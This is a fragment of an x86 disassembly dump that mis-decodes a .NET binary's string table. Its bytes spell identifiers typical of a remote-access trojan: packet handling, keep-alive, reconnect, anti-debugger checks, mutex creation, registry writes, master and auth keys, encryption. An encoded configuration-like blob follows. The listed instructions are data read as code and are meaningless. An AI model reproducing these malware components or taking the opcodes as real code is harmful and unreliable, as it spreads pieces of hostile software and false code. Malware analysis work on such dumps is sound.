  40913e:	6f                   	outsl  %ds:(%esi),(%dx)
  40913f:	61                   	popa
  409140:	74 00                	je     0x409142
  409142:	46                   	inc    %esi
  409143:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40914a:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40914e:	61                   	popa
  40914f:	6e                   	outsb  %ds:(%esi),(%dx)
  409150:	61                   	popa
  409151:	67 65 6d             	gs insl (%dx),%es:(%di)
  409154:	65 6e                	outsb  %gs:(%esi),(%dx)
  409156:	74 42                	je     0x40919a
  409158:	61                   	popa
  409159:	73 65                	jae    0x4091c0
  40915b:	4f                   	dec    %edi
  40915c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40915f:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409163:	6f                   	outsl  %ds:(%esi),(%dx)
  409164:	72 63                	jb     0x4091c9
  409166:	65 50                	gs push %eax
  409168:	61                   	popa
  409169:	74 68                	je     0x4091d3
  40916b:	4f                   	dec    %edi
  40916c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40916f:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409173:	6f                   	outsl  %ds:(%esi),(%dx)
  409174:	6c                   	insb   (%dx),%es:(%edi)
  409175:	6c                   	insb   (%dx),%es:(%edi)
  409176:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40917b:	6f                   	outsl  %ds:(%esi),(%dx)
  40917c:	6e                   	outsb  %ds:(%esi),(%dx)
  40917d:	6e                   	outsb  %ds:(%esi),(%dx)
  40917e:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409183:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409187:	6e                   	outsb  %ds:(%esi),(%dx)
  409188:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40918d:	65 74 00             	gs je  0x409190
  409190:	53                   	push   %ebx
  409191:	79 73                	jns    0x409206
  409193:	74 65                	je     0x4091fa
  409195:	6d                   	insl   (%dx),%es:(%edi)
  409196:	2e 4e                	cs dec %esi
  409198:	65 74 00             	gs je  0x40919b
  40919b:	53                   	push   %ebx
  40919c:	65 74 00             	gs je  0x40919f
  40919f:	54                   	push   %esp
  4091a0:	61                   	popa
  4091a1:	72 67                	jb     0x40920a
  4091a3:	65 74 00             	gs je  0x4091a6
  4091a6:	43                   	inc    %ebx
  4091a7:	6c                   	insb   (%dx),%es:(%edi)
  4091a8:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091af:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b0:	64 6c                	fs insb (%dx),%es:(%edi)
  4091b2:	65 5f                	gs pop %edi
  4091b4:	50                   	push   %eax
  4091b5:	61                   	popa
  4091b6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091b9:	74 00                	je     0x4091bb
  4091bb:	4b                   	dec    %ebx
  4091bc:	65 65 70 41          	gs gs jo 0x409201
  4091c0:	6c                   	insb   (%dx),%es:(%edi)
  4091c1:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091c8:	65 74 00             	gs je  0x4091cb
  4091cb:	43                   	inc    %ebx
  4091cc:	6c                   	insb   (%dx),%es:(%edi)
  4091cd:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091d4:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091d8:	53                   	push   %ebx
  4091d9:	79 73                	jns    0x40924e
  4091db:	74 65                	je     0x409242
  4091dd:	6d                   	insl   (%dx),%es:(%edi)
  4091de:	2e 43                	cs inc %ebx
  4091e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e1:	6c                   	insb   (%dx),%es:(%edi)
  4091e2:	6c                   	insb   (%dx),%es:(%edi)
  4091e3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e9:	73 2e                	jae    0x409219
  4091eb:	49                   	dec    %ecx
  4091ec:	45                   	inc    %ebp
  4091ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ee:	75 6d                	jne    0x40925d
  4091f0:	65 72 61             	gs jb  0x409254
  4091f3:	74 6f                	je     0x409264
  4091f5:	72 2e                	jb     0x409225
  4091f7:	52                   	push   %edx
  4091f8:	65 73 65             	gs jae 0x409260
  4091fb:	74 00                	je     0x4091fd
  4091fd:	67 65 74 5f          	addr16 gs je 0x409260
  409201:	4f                   	dec    %edi
  409202:	66 66 73 65          	data16 data16 jae 0x40926b
  409206:	74 00                	je     0x409208
  409208:	73 65                	jae    0x40926f
  40920a:	74 5f                	je     0x40926b
  40920c:	4f                   	dec    %edi
  40920d:	66 66 73 65          	data16 data16 jae 0x409276
  409211:	74 00                	je     0x409213
  409213:	53                   	push   %ebx
  409214:	70 6c                	jo     0x409282
  409216:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  40921d:	6e 
  40921e:	74 4f                	je     0x40926f
  409220:	6e                   	outsb  %ds:(%esi),(%dx)
  409221:	45                   	inc    %ebp
  409222:	78 69                	js     0x40928d
  409224:	74 00                	je     0x409226
  409226:	53                   	push   %ebx
  409227:	61                   	popa
  409228:	6c                   	insb   (%dx),%es:(%edi)
  409229:	74 00                	je     0x40922b
  40922b:	49                   	dec    %ecx
  40922c:	41                   	inc    %ecx
  40922d:	73 79                	jae    0x4092a8
  40922f:	6e                   	outsb  %ds:(%esi),(%dx)
  409230:	63 52 65             	arpl   %edx,0x65(%edx)
  409233:	73 75                	jae    0x4092aa
  409235:	6c                   	insb   (%dx),%es:(%edi)
  409236:	74 00                	je     0x409238
  409238:	54                   	push   %esp
  409239:	6f                   	outsl  %ds:(%esi),(%dx)
  40923a:	55                   	push   %ebp
  40923b:	70 70                	jo     0x4092ad
  40923d:	65 72 49             	gs jb  0x409289
  409240:	6e                   	outsb  %ds:(%esi),(%dx)
  409241:	76 61                	jbe    0x4092a4
  409243:	72 69                	jb     0x4092ae
  409245:	61                   	popa
  409246:	6e                   	outsb  %ds:(%esi),(%dx)
  409247:	74 00                	je     0x409249
  409249:	57                   	push   %edi
  40924a:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40924e:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409255:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40925c:	65 
  40925d:	43                   	inc    %ebx
  40925e:	6c                   	insb   (%dx),%es:(%edi)
  40925f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409266:	74 5f                	je     0x4092c7
  409268:	53                   	push   %ebx
  409269:	73 6c                	jae    0x4092d7
  40926b:	43                   	inc    %ebx
  40926c:	6c                   	insb   (%dx),%es:(%edi)
  40926d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409274:	74 5f                	je     0x4092d5
  409276:	53                   	push   %ebx
  409277:	73 6c                	jae    0x4092e5
  409279:	43                   	inc    %ebx
  40927a:	6c                   	insb   (%dx),%es:(%edi)
  40927b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409282:	74 5f                	je     0x4092e3
  409284:	54                   	push   %esp
  409285:	63 70 43             	arpl   %esi,0x43(%eax)
  409288:	6c                   	insb   (%dx),%es:(%edi)
  409289:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409290:	74 5f                	je     0x4092f1
  409292:	54                   	push   %esp
  409293:	63 70 43             	arpl   %esi,0x43(%eax)
  409296:	6c                   	insb   (%dx),%es:(%edi)
  409297:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  40929e:	74 68                	je     0x409308
  4092a0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092a2:	74 69                	je     0x40930d
  4092a4:	63 61 74             	arpl   %esp,0x74(%ecx)
  4092a7:	65 41                	gs inc %ecx
  4092a9:	73 43                	jae    0x4092ee
  4092ab:	6c                   	insb   (%dx),%es:(%edi)
  4092ac:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092b3:	73 74                	jae    0x409329
  4092b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4092b7:	2e 4d                	cs dec %ebp
  4092b9:	61                   	popa
  4092ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bb:	61                   	popa
  4092bc:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c1:	74 00                	je     0x4092c3
  4092c3:	45                   	inc    %ebp
  4092c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c5:	76 69                	jbe    0x409330
  4092c7:	72 6f                	jb     0x409338
  4092c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ca:	6d                   	insl   (%dx),%es:(%edi)
  4092cb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092cd:	74 00                	je     0x4092cf
  4092cf:	70 61                	jo     0x409332
  4092d1:	72 65                	jb     0x409338
  4092d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d4:	74 00                	je     0x4092d6
  4092d6:	53                   	push   %ebx
  4092d7:	79 73                	jns    0x40934c
  4092d9:	74 65                	je     0x409340
  4092db:	6d                   	insl   (%dx),%es:(%edi)
  4092dc:	2e 43                	cs inc %ebx
  4092de:	6f                   	outsl  %ds:(%esi),(%dx)
  4092df:	6c                   	insb   (%dx),%es:(%edi)
  4092e0:	6c                   	insb   (%dx),%es:(%edi)
  4092e1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e7:	73 2e                	jae    0x409317
  4092e9:	49                   	dec    %ecx
  4092ea:	45                   	inc    %ebp
  4092eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ec:	75 6d                	jne    0x40935b
  4092ee:	65 72 61             	gs jb  0x409352
  4092f1:	74 6f                	je     0x409362
  4092f3:	72 2e                	jb     0x409323
  4092f5:	43                   	inc    %ebx
  4092f6:	75 72                	jne    0x40936a
  4092f8:	72 65                	jb     0x40935f
  4092fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fb:	74 00                	je     0x4092fd
  4092fd:	53                   	push   %ebx
  4092fe:	79 73                	jns    0x409373
  409300:	74 65                	je     0x409367
  409302:	6d                   	insl   (%dx),%es:(%edi)
  409303:	2e 43                	cs inc %ebx
  409305:	6f                   	outsl  %ds:(%esi),(%dx)
  409306:	6c                   	insb   (%dx),%es:(%edi)
  409307:	6c                   	insb   (%dx),%es:(%edi)
  409308:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	73 2e                	jae    0x40933e
  409310:	49                   	dec    %ecx
  409311:	45                   	inc    %ebp
  409312:	6e                   	outsb  %ds:(%esi),(%dx)
  409313:	75 6d                	jne    0x409382
  409315:	65 72 61             	gs jb  0x409379
  409318:	74 6f                	je     0x409389
  40931a:	72 2e                	jb     0x40934a
  40931c:	67 65 74 5f          	addr16 gs je 0x40937f
  409320:	43                   	inc    %ebx
  409321:	75 72                	jne    0x409395
  409323:	72 65                	jb     0x40938a
  409325:	6e                   	outsb  %ds:(%esi),(%dx)
  409326:	74 00                	je     0x409328
  409328:	47                   	inc    %edi
  409329:	65 74 43             	gs je  0x40936f
  40932c:	75 72                	jne    0x4093a0
  40932e:	72 65                	jb     0x409395
  409330:	6e                   	outsb  %ds:(%esi),(%dx)
  409331:	74 00                	je     0x409333
  409333:	43                   	inc    %ebx
  409334:	68 65 63 6b 52       	push   $0x526b6365
  409339:	65 6d                	gs insl (%dx),%es:(%edi)
  40933b:	6f                   	outsl  %ds:(%esi),(%dx)
  40933c:	74 65                	je     0x4093a3
  40933e:	44                   	inc    %esp
  40933f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409343:	67 65 72 50          	addr16 gs jb 0x409397
  409347:	72 65                	jb     0x4093ae
  409349:	73 65                	jae    0x4093b0
  40934b:	6e                   	outsb  %ds:(%esi),(%dx)
  40934c:	74 00                	je     0x40934e
  40934e:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409355:	67 65 72 50          	addr16 gs jb 0x4093a9
  409359:	72 65                	jb     0x4093c0
  40935b:	73 65                	jae    0x4093c2
  40935d:	6e                   	outsb  %ds:(%esi),(%dx)
  40935e:	74 00                	je     0x409360
  409360:	67 65 74 5f          	addr16 gs je 0x4093c3
  409364:	52                   	push   %edx
  409365:	65 6d                	gs insl (%dx),%es:(%edi)
  409367:	6f                   	outsl  %ds:(%esi),(%dx)
  409368:	74 65                	je     0x4093cf
  40936a:	45                   	inc    %ebp
  40936b:	6e                   	outsb  %ds:(%esi),(%dx)
  40936c:	64 50                	fs push %eax
  40936e:	6f                   	outsl  %ds:(%esi),(%dx)
  40936f:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409376:	5f                   	pop    %edi
  409377:	43                   	inc    %ebx
  409378:	6f                   	outsl  %ds:(%esi),(%dx)
  409379:	75 6e                	jne    0x4093e9
  40937b:	74 00                	je     0x40937d
  40937d:	67 65 74 5f          	addr16 gs je 0x4093e0
  409381:	50                   	push   %eax
  409382:	72 6f                	jb     0x4093f3
  409384:	63 65 73             	arpl   %esp,0x73(%ebp)
  409387:	73 6f                	jae    0x4093f8
  409389:	72 43                	jb     0x4093ce
  40938b:	6f                   	outsl  %ds:(%esi),(%dx)
  40938c:	75 6e                	jne    0x4093fc
  40938e:	74 00                	je     0x409390
  409390:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409393:	6e                   	outsb  %ds:(%esi),(%dx)
  409394:	74 00                	je     0x409396
  409396:	47                   	inc    %edi
  409397:	65 74 50             	gs je  0x4093ea
  40939a:	61                   	popa
  40939b:	74 68                	je     0x409405
  40939d:	52                   	push   %edx
  40939e:	6f                   	outsl  %ds:(%esi),(%dx)
  40939f:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a0:	74 00                	je     0x4093a2
  4093a2:	44                   	inc    %esp
  4093a3:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4093a7:	70 74                	jo     0x40941d
  4093a9:	00 45 6e             	add    %al,0x6e(%ebp)
  4093ac:	63 72 79             	arpl   %esi,0x79(%edx)
  4093af:	70 74                	jo     0x409425
  4093b1:	00 50 61             	add    %dl,0x61(%eax)
  4093b4:	72 61                	jb     0x409417
  4093b6:	6d                   	insl   (%dx),%es:(%edi)
  4093b7:	65 74 65             	gs je  0x40941f
  4093ba:	72 69                	jb     0x409425
  4093bc:	7a 65                	jp     0x409423
  4093be:	64 54                	fs push %esp
  4093c0:	68 72 65 61 64       	push   $0x64616572
  4093c5:	53                   	push   %ebx
  4093c6:	74 61                	je     0x409429
  4093c8:	72 74                	jb     0x40943e
  4093ca:	00 43 6f             	add    %al,0x6f(%ebx)
  4093cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ce:	76 65                	jbe    0x409435
  4093d0:	72 74                	jb     0x409446
  4093d2:	00 46 61             	add    %al,0x61(%esi)
  4093d5:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093dc:	54 
  4093dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4093de:	4c                   	dec    %esp
  4093df:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093e6:	75 74                	jne    0x40945c
  4093e8:	00 53 79             	add    %dl,0x79(%ebx)
  4093eb:	73 74                	jae    0x409461
  4093ed:	65 6d                	gs insl (%dx),%es:(%edi)
  4093ef:	2e 43                	cs inc %ebx
  4093f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f2:	6c                   	insb   (%dx),%es:(%edi)
  4093f3:	6c                   	insb   (%dx),%es:(%edi)
  4093f4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4093fa:	73 2e                	jae    0x40942a
  4093fc:	49                   	dec    %ecx
  4093fd:	45                   	inc    %ebp
  4093fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ff:	75 6d                	jne    0x40946e
  409401:	65 72 61             	gs jb  0x409465
  409404:	74 6f                	je     0x409475
  409406:	72 2e                	jb     0x409436
  409408:	4d                   	dec    %ebp
  409409:	6f                   	outsl  %ds:(%esi),(%dx)
  40940a:	76 65                	jbe    0x409471
  40940c:	4e                   	dec    %esi
  40940d:	65 78 74             	gs js  0x409484
  409410:	00 53 79             	add    %dl,0x79(%ebx)
  409413:	73 74                	jae    0x409489
  409415:	65 6d                	gs insl (%dx),%es:(%edi)
  409417:	2e 54                	cs push %esp
  409419:	65 78 74             	gs js  0x409490
  40941c:	00 47 65             	add    %al,0x65(%edi)
  40941f:	74 57                	je     0x409478
  409421:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409428:	78 74                	js     0x40949e
  40942a:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40942e:	74 00                	je     0x409430
  409430:	76 00                	jbe    0x409432
  409432:	47                   	inc    %edi
  409433:	65 74 46             	gs je  0x40947c
  409436:	6f                   	outsl  %ds:(%esi),(%dx)
  409437:	72 65                	jb     0x40949e
  409439:	67 72 6f             	addr16 jb 0x4094ab
  40943c:	75 6e                	jne    0x4094ac
  40943e:	64 57                	fs push %edi
  409440:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409447:	65 74 5f             	gs je  0x4094a9
  40944a:	43                   	inc    %ebx
  40944b:	72 65                	jb     0x4094b2
  40944d:	61                   	popa
  40944e:	74 65                	je     0x4094b5
  409450:	4e                   	dec    %esi
  409451:	6f                   	outsl  %ds:(%esi),(%dx)
  409452:	57                   	push   %edi
  409453:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40945a:	6e                   	outsb  %ds:(%esi),(%dx)
  40945b:	64 65 78 00          	fs gs js 0x40945f
  40945f:	43                   	inc    %ebx
  409460:	6c                   	insb   (%dx),%es:(%edi)
  409461:	6f                   	outsl  %ds:(%esi),(%dx)
  409462:	73 65                	jae    0x4094c9
  409464:	4d                   	dec    %ebp
  409465:	75 74                	jne    0x4094db
  409467:	65 78 00             	gs js  0x40946a
  40946a:	43                   	inc    %ebx
  40946b:	72 65                	jb     0x4094d2
  40946d:	61                   	popa
  40946e:	74 65                	je     0x4094d5
  409470:	4d                   	dec    %ebp
  409471:	75 74                	jne    0x4094e7
  409473:	65 78 00             	gs js  0x409476
  409476:	44                   	inc    %esp
  409477:	65 6c                	gs insb (%dx),%es:(%edi)
  409479:	61                   	popa
  40947a:	79 00                	jns    0x40947c
  40947c:	57                   	push   %edi
  40947d:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409484:	61                   	popa
  409485:	79 00                	jns    0x409487
  409487:	49                   	dec    %ecx
  409488:	6e                   	outsb  %ds:(%esi),(%dx)
  409489:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409490:	65 
  409491:	41                   	inc    %ecx
  409492:	72 72                	jb     0x409506
  409494:	61                   	popa
  409495:	79 00                	jns    0x409497
  409497:	4d                   	dec    %ebp
  409498:	73 67                	jae    0x409501
  40949a:	50                   	push   %eax
  40949b:	61                   	popa
  40949c:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40949f:	72 72                	jb     0x409513
  4094a1:	61                   	popa
  4094a2:	79 00                	jns    0x4094a4
  4094a4:	54                   	push   %esp
  4094a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a6:	41                   	inc    %ecx
  4094a7:	72 72                	jb     0x40951b
  4094a9:	61                   	popa
  4094aa:	79 00                	jns    0x4094ac
  4094ac:	67 65 74 5f          	addr16 gs je 0x40950f
  4094b0:	41                   	inc    %ecx
  4094b1:	73 41                	jae    0x4094f4
  4094b3:	72 72                	jb     0x409527
  4094b5:	61                   	popa
  4094b6:	79 00                	jns    0x4094b8
  4094b8:	72 65                	jb     0x40951f
  4094ba:	66 41                	inc    %cx
  4094bc:	73 41                	jae    0x4094ff
  4094be:	72 72                	jb     0x409532
  4094c0:	61                   	popa
  4094c1:	79 00                	jns    0x4094c3
  4094c3:	67 65 74 5f          	addr16 gs je 0x409526
  4094c7:	4b                   	dec    %ebx
  4094c8:	65 79 00             	gs jns 0x4094cb
  4094cb:	73 65                	jae    0x409532
  4094cd:	74 5f                	je     0x40952e
  4094cf:	4b                   	dec    %ebx
  4094d0:	65 79 00             	gs jns 0x4094d3
  4094d3:	43                   	inc    %ebx
  4094d4:	72 65                	jb     0x40953b
  4094d6:	61                   	popa
  4094d7:	74 65                	je     0x40953e
  4094d9:	53                   	push   %ebx
  4094da:	75 62                	jne    0x40953e
  4094dc:	4b                   	dec    %ebx
  4094dd:	65 79 00             	gs jns 0x4094e0
  4094e0:	44                   	inc    %esp
  4094e1:	65 6c                	gs insb (%dx),%es:(%edi)
  4094e3:	65 74 65             	gs je  0x40954b
  4094e6:	53                   	push   %ebx
  4094e7:	75 62                	jne    0x40954b
  4094e9:	4b                   	dec    %ebx
  4094ea:	65 79 00             	gs jns 0x4094ed
  4094ed:	4f                   	dec    %edi
  4094ee:	70 65                	jo     0x409555
  4094f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094f1:	53                   	push   %ebx
  4094f2:	75 62                	jne    0x409556
  4094f4:	4b                   	dec    %ebx
  4094f5:	65 79 00             	gs jns 0x4094f8
  4094f8:	67 65 74 5f          	addr16 gs je 0x40955b
  4094fc:	50                   	push   %eax
  4094fd:	75 62                	jne    0x409561
  4094ff:	6c                   	insb   (%dx),%es:(%edi)
  409500:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  409507:	61                   	popa
  409508:	75 74                	jne    0x40957e
  40950a:	68 4b 65 79 00       	push   $0x79654b
  40950f:	6d                   	insl   (%dx),%es:(%edi)
  409510:	61                   	popa
  409511:	73 74                	jae    0x409587
  409513:	65 72 4b             	gs jb  0x409561
  409516:	65 79 00             	gs jns 0x409519
  409519:	52                   	push   %edx
  40951a:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409521:	4b 65 
  409523:	79 00                	jns    0x409525
  409525:	5f                   	pop    %edi
  409526:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40952a:	53                   	push   %ebx
  40952b:	79 73                	jns    0x4095a0
  40952d:	74 65                	je     0x409594
  40952f:	6d                   	insl   (%dx),%es:(%edi)
  409530:	2e 53                	cs push %ebx
  409532:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409536:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40953d:	70 
  40953e:	74 6f                	je     0x4095af
  409540:	67 72 61             	addr16 jb 0x4095a4
  409543:	70 68                	jo     0x4095ad
  409545:	79 00                	jns    0x409547
  409547:	41                   	inc    %ecx
  409548:	73 73                	jae    0x4095bd
  40954a:	65 6d                	gs insl (%dx),%es:(%edi)
  40954c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409550:	41                   	inc    %ecx
  409551:	64 64 72 65          	fs fs jb 0x4095ba
  409555:	73 73                	jae    0x4095ca
  409557:	46                   	inc    %esi
  409558:	61                   	popa
  409559:	6d                   	insl   (%dx),%es:(%edi)
  40955a:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409561:	63 
  409562:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409566:	79 00                	jns    0x409568
  409568:	57                   	push   %edi
  409569:	72 69                	jb     0x4095d4
  40956b:	74 65                	je     0x4095d2
  40956d:	42                   	inc    %edx
  40956e:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409575:	6f                   	outsl  %ds:(%esi),(%dx)
  409576:	42                   	inc    %edx
  409577:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40957e:	65 74 5f             	gs je  0x4095e0
  409581:	53                   	push   %ebx
  409582:	79 73                	jns    0x4095f7
  409584:	74 65                	je     0x4095eb
  409586:	6d                   	insl   (%dx),%es:(%edi)
  409587:	44                   	inc    %esp
  409588:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40958f:	79 00                	jns    0x409591
  409591:	53                   	push   %ebx
  409592:	65 74 52             	gs je  0x4095e7
  409595:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40959c:	00 6f 
  40959e:	70 5f                	jo     0x4095ff
  4095a0:	45                   	inc    %ebp
  4095a1:	71 75                	jno    0x409618
  4095a3:	61                   	popa
  4095a4:	6c                   	insb   (%dx),%es:(%edi)
  4095a5:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095ac:	49 
  4095ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ae:	65 71 75             	gs jno 0x409626
  4095b1:	61                   	popa
  4095b2:	6c                   	insb   (%dx),%es:(%edi)
  4095b3:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095ba:	74 
  4095bb:	65 6d                	gs insl (%dx),%es:(%edi)
  4095bd:	2e 4e                	cs dec %esi
  4095bf:	65 74 2e             	gs je  0x4095f0
  4095c2:	53                   	push   %ebx
  4095c3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095c7:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095ce:	64 
  4095cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d0:	77 73                	ja     0x409645
  4095d2:	49                   	dec    %ecx
  4095d3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095d6:	74 69                	je     0x409641
  4095d8:	74 79                	je     0x409653
  4095da:	00 49 73             	add    %cl,0x73(%ecx)
  4095dd:	4e                   	dec    %esi
  4095de:	75 6c                	jne    0x40964c
  4095e0:	6c                   	insb   (%dx),%es:(%edi)
  4095e1:	4f                   	dec    %edi
  4095e2:	72 45                	jb     0x409629
  4095e4:	6d                   	insl   (%dx),%es:(%edi)
  4095e5:	70 74                	jo     0x40965b
  4095e7:	79 00                	jns    0x4095e9
  4095e9:	00 00                	add    %al,(%eax)
  4095eb:	00 00                	add    %al,(%eax)
  4095ed:	0d 53 00 48 00       	or     $0x480053,%eax
  4095f2:	41                   	inc    %ecx
  4095f3:	00 32                	add    %dh,(%edx)
  4095f5:	00 35 00 36 00 00    	add    %dh,0x3600
  4095fb:	81 01 54 00 59 00    	addl   $0x590054,(%ecx)
  409601:	49                   	dec    %ecx
  409602:	00 33                	add    %dh,(%ebx)
  409604:	00 6e 00             	add    %ch,0x0(%esi)
  409607:	6e                   	outsb  %ds:(%esi),(%dx)
  409608:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40960c:	00 56 00             	add    %dl,0x0(%esi)
  40960f:	4b                   	dec    %ebx
  409610:	00 66 00             	add    %ah,0x0(%esi)
  409613:	7a 00                	jp     0x409615
  409615:	55                   	push   %ebp
  409616:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40961a:	00 4a 00             	add    %cl,0x0(%edx)
  40961d:	53                   	push   %ebx
  40961e:	00 65 00             	add    %ah,0x0(%ebp)
  409621:	4a                   	dec    %edx
  409622:	00 6e 00             	add    %ch,0x0(%esi)
  409625:	63 00                	arpl   %eax,(%eax)
  409627:	52                   	push   %edx
  409628:	00 4f 00             	add    %cl,0x0(%edi)
  40962b:	57                   	push   %edi
  40962c:	00 59 00             	add    %bl,0x0(%ecx)
  40962f:	2f                   	das
  409630:	00 4d 00             	add    %cl,0x0(%ebp)
  409633:	4f                   	dec    %edi
  409634:	00 32                	add    %dh,(%edx)
  409636:	00 68 00             	add    %ch,0x0(%eax)
  409639:	6c                   	insb   (%dx),%es:(%edi)
  40963a:	00 72 00             	add    %dh,0x0(%edx)
  40963d:	48                   	dec    %eax
  40963e:	00 35 00 4a 00 79    	add    %dh,0x79004a00
  409644:	00 73 00             	add    %dh,0x0(%ebx)
  409647:	4a                   	dec    %edx
  409648:	00 35 00 53 00 47    	add    %dh,0x47005300
  40964e:	00 77 00             	add    %dh,0x0(%edi)
  409651:	77 00                	ja     0x409653
  409653:	2b 00                	sub    (%eax),%eax
  409655:	79 00                	jns    0x409657
  409657:	69 00 4f 00 75 00    	imul   $0x75004f,(%eax),%eax
  40965d:	44                   	inc    %esp
  40965e:	00 6e 00             	add    %ch,0x0(%esi)
  409661:	54                   	push   %esp
  409662:	00 55 00             	add    %dl,0x0(%ebp)
  409665:	41                   	inc    %ecx
  409666:	00 52 00             	add    %dl,0x0(%edx)
  409669:	46                   	inc    %esi
  40966a:	00 33                	add    %dh,(%ebx)
  40966c:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  409670:	00 68 00             	add    %ch,0x0(%eax)
  409673:	74 00                	je     0x409675
  409675:	6a 00                	push   $0x0
  409677:	43                   	inc    %ebx
  409678:	00 51 00             	add    %dl,0x0(%ecx)
  40967b:	41                   	inc    %ecx
  40967c:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
